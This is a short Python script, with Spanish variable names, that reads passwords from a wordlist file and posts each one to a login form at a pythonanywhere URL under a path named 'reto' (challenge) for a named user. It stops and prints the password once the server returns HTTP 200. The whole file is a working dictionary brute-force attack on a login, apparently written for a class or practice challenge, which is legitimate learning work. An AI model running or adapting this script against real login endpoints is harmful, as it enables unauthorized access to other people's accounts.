import requests

archivo = open('listado-general.txt', 'r', encoding='utf8')
for palabra in archivo.readlines():
    datos = {
        'nombre': 'Leonel Macedo Mora', 
        'nick': 'Macor', 
        'pass': palabra.strip('\n')
    }
    url = 'https://xl666.pythonanywhere.com/reto/'
    res = requests.post(url, data=datos)

    if res.status_code in [200]:
        print('Correcto: ', palabra.strip('\n'))
        break
    else:
        print('Incorrecto: ', palabra.strip('\n'))
